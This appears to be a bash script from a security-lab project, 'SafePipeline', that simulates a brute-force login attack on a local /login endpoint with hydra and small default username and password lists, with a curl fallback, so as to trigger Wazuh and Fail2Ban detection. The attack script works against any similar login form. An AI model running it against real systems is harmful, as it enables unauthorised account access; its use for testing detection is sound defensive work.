#!/bin/bash
# SafePipeline — Brute force attack on /login
# Tool: hydra
# Detection: Wazuh alert (rule 100003) + Fail2Ban ban after 5 attempts
#
# Usage: bash brute_force.sh [target_ip] [target_port]
# Example: bash brute_force.sh localhost 5000
#
# ⚠️  Run ONLY against localhost or a controlled environment you own.

TARGET=${1:-localhost}
PORT=${2:-5000}
WORDLIST_USER="users.txt"
WORDLIST_PASS="passwords.txt"

echo "[*] SafePipeline — Brute Force Simulation"
echo "[*] Target : http://$TARGET:$PORT/login"
echo ""

# Create wordlists if they don't exist
cat > "$WORDLIST_USER" << 'EOF'
admin
alice
bob
root
user
test
EOF

cat > "$WORDLIST_PASS" << 'EOF'
password
123456
admin
admin123
letmein
qwerty
password1
EOF

echo "[*] Checking target is reachable..."
if ! curl -s --connect-timeout 3 "http://$TARGET:$PORT/login" > /dev/null; then
    echo "[!] Cannot reach $TARGET:$PORT — start the app first."
    exit 1
fi

echo "[+] Target reachable. Starting brute force with hydra..."
echo ""

# Check if hydra is available
if command -v hydra &> /dev/null; then
    hydra \
        -L "$WORDLIST_USER" \
        -P "$WORDLIST_PASS" \
        -s "$PORT" \
        "$TARGET" \
        http-post-form \
        "/login:username=^USER^&password=^PASS^:Invalid credentials" \
        -V -f
else
    echo "[!] hydra not found — running manual simulation instead"
    echo "[*] Sending 10 failed login attempts..."
    for i in $(seq 1 10); do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST "http://$TARGET:$PORT/login" \
            -d "username=admin&password=wrongpassword$i")
        echo "    Attempt $i — HTTP $RESPONSE"
    done
fi

echo ""
echo "[+] Done. Check:"
echo "    - /var/log/safepipeline/app.log for login_failed events"
echo "    - Wazuh dashboard for alert (rule 100003 — brute force)"
echo "    - Fail2Ban: sudo fail2ban-client status safepipeline-auth"

# Cleanup
rm -f "$WORDLIST_USER" "$WORDLIST_PASS"
